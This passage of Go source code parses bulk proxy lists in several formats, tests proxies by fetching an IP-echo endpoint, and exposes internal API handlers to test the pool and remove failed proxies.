	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}

	start := time.Now()
	resp, err := client.Get("https://httpbin.org/ip")
	latencyMs := time.Since(start).Milliseconds()

	if err != nil {
		return false, "", latencyMs
	}
	defer resp.Body.Close()

	var result struct {
		Origin string `json:"origin"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return false, "", latencyMs
	}

	return true, result.Origin, latencyMs
}

// parseProxyURL parses a proxy URL string
func parseProxyURL(proxyStr string) (*url.URL, error) {
	// Handle different proxy types
	if !strings.Contains(proxyStr, "://") {
		proxyStr = "socks5://" + proxyStr
	}
	return url.Parse(proxyStr)
}

// ============================================
// BULK PROXY IMPORT PARSER
// ============================================

// BulkImportRequest represents a bulk proxy import request
type BulkImportRequest struct {
	ProxyType string   `json:"proxy_type"` // "socks5", "socks5h", "http", "https"
	Lines     []string `json:"lines"`      // Raw proxy lines
}

// BulkImportResponse represents the result of bulk import
type BulkImportResponse struct {
	Success  bool        `json:"success"`
	Imported int         `json:"imported"`
	Failed   int         `json:"failed"`
	Errors   []string    `json:"errors,omitempty"`
	Proxies  []ProxyInfo `json:"proxies"`
}

// ParseProxyLine parses a single proxy line in various formats
// Supported formats:
//   - host:port
//   - host|port
//   - host:port:user:pass
//   - host|port|user|pass
//   - user:pass@host:port
//   - socks5://user:pass@host:port (URL format)
func ParseProxyLine(line string, defaultType string) (*ProxyInfo, error) {
	line = strings.TrimSpace(line)
	if line == "" {
		return nil, fmt.Errorf("empty line")
	}

	// Skip comments
	if strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
		return nil, fmt.Errorf("comment line")
	}

	proxy := &ProxyInfo{
		Type:   defaultType,
		Active: true,
		Status: "untested",
	}

	// Check if it's a URL format (contains ://)
	if strings.Contains(line, "://") {
		return parseProxyURLFormat(line)
	}

	// Check if it's user:pass@host:port format
	if strings.Contains(line, "@") {
		return parseProxyAtFormat(line, defaultType)
	}

	// Determine delimiter (: or |)
	delimiter := ":"
	if strings.Contains(line, "|") {
		delimiter = "|"
	}

	parts := strings.Split(line, delimiter)

	switch len(parts) {
	case 2:
		// host:port or host|port
		proxy.Host = strings.TrimSpace(parts[0])
		port, err := parsePort(parts[1])
		if err != nil {
			return nil, fmt.Errorf("invalid port: %s", parts[1])
		}
		proxy.Port = port

	case 4:
		// host:port:user:pass or host|port|user|pass
		proxy.Host = strings.TrimSpace(parts[0])
		port, err := parsePort(parts[1])
		if err != nil {
			return nil, fmt.Errorf("invalid port: %s", parts[1])
		}
		proxy.Port = port
		proxy.Username = strings.TrimSpace(parts[2])
		proxy.Password = strings.TrimSpace(parts[3])

	default:
		return nil, fmt.Errorf("unsupported format: expected host:port or host:port:user:pass")
	}

	if proxy.Host == "" {
		return nil, fmt.Errorf("empty host")
	}

	return proxy, nil
}

// parseProxyURLFormat parses URL format like socks5://user:pass@host:port
func parseProxyURLFormat(line string) (*ProxyInfo, error) {
	u, err := url.Parse(line)
	if err != nil {
		return nil, fmt.Errorf("invalid URL format: %v", err)
	}

	proxy := &ProxyInfo{
		Type:   strings.ToLower(u.Scheme),
		Host:   u.Hostname(),
		Active: true,
		Status: "untested",
	}

	// Parse port
	portStr := u.Port()
	if portStr == "" {
		return nil, fmt.Errorf("missing port in URL")
	}
	port, err := parsePort(portStr)
	if err != nil {
		return nil, err
	}
	proxy.Port = port

	// Parse credentials
	if u.User != nil {
		proxy.Username = u.User.Username()
		if pass, ok := u.User.Password(); ok {
			proxy.Password = pass
		}
	}

	return proxy, nil
}

// parseProxyAtFormat parses user:pass@host:port format
func parseProxyAtFormat(line string, defaultType string) (*ProxyInfo, error) {
	atIdx := strings.LastIndex(line, "@")
	if atIdx == -1 {
		return nil, fmt.Errorf("invalid @ format")
	}

	authPart := line[:atIdx]
	hostPart := line[atIdx+1:]

	proxy := &ProxyInfo{
		Type:   defaultType,
		Active: true,
		Status: "untested",
	}

	// Parse auth (user:pass)
	authParts := strings.SplitN(authPart, ":", 2)
	if len(authParts) == 2 {
		proxy.Username = authParts[0]
		proxy.Password = authParts[1]
	} else {
		proxy.Username = authPart
	}

	// Parse host:port
	hostParts := strings.Split(hostPart, ":")
	if len(hostParts) != 2 {
		return nil, fmt.Errorf("invalid host:port format after @")
	}

	proxy.Host = strings.TrimSpace(hostParts[0])
	port, err := parsePort(hostParts[1])
	if err != nil {
		return nil, err
	}
	proxy.Port = port

	return proxy, nil
}

// parsePort converts a string to port number
func parsePort(s string) (int, error) {
	s = strings.TrimSpace(s)
	var port int
	_, err := fmt.Sscanf(s, "%d", &port)
	if err != nil {
		return 0, fmt.Errorf("invalid port number")
	}
	if port < 1 || port > 65535 {
		return 0, fmt.Errorf("port out of range (1-65535)")
	}
	return port, nil
}

// Callback functions for test-all and clear-failed (set by HttpProxy)
var (
	testAllProxiesFunc     func() (total, passed, failed int)
	clearFailedProxiesFunc func() int
)

// SetProxyPoolTestCallbacks sets the callback functions for testing and clearing proxies
func SetProxyPoolTestCallbacks(
	testAll func() (total, passed, failed int),
	clearFailed func() int,
) {
	testAllProxiesFunc = testAll
	clearFailedProxiesFunc = clearFailed
}

// handleProxyPoolTestAll tests all proxies in the pool
func (api *InternalAPI) handleProxyPoolTestAll(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	if testAllProxiesFunc == nil {
		http.Error(w, `{"error":"test function not initialized"}`, http.StatusServiceUnavailable)
		return
	}

	total, passed, failed := testAllProxiesFunc()
	log.Info("internal-api: Tested all proxies - total: %d, passed: %d, failed: %d", total, passed, failed)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"total":   total,
		"passed":  passed,
		"failed":  failed,
	})
}

// handleProxyPoolClearFailed removes all failed proxies from the pool
func (api *InternalAPI) handleProxyPoolClearFailed(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	if clearFailedProxiesFunc == nil {
		http.Error(w, `{"error":"clear function not initialized"}`, http.StatusServiceUnavailable)
		return
	}

	removed := clearFailedProxiesFunc()
	log.Info("internal-api: Cleared %d failed proxies", removed)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"removed": removed,
	})
}

// ParseBulkProxies parses multiple proxy lines
func ParseBulkProxies(lines []string, proxyType string) (*BulkImportResponse, error) {
	response := &BulkImportResponse{
		Success: true,
		Proxies: []ProxyInfo{},
		Errors:  []string{},
	}

	for i, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		proxy, err := ParseProxyLine(line, proxyType)
		if err != nil {
			// Skip comment lines silently
			if strings.Contains(err.Error(), "comment") {
				continue
			}
			response.Failed++
			response.Errors = append(response.Errors, fmt.Sprintf("Line %d: %s", i+1, err.Error()))
			continue
		}

		response.Imported++
		response.Proxies = append(response.Proxies, *proxy)
	}

	if response.Imported == 0 && response.Failed > 0 {
		response.Success = false
	}

	return response, nil
}
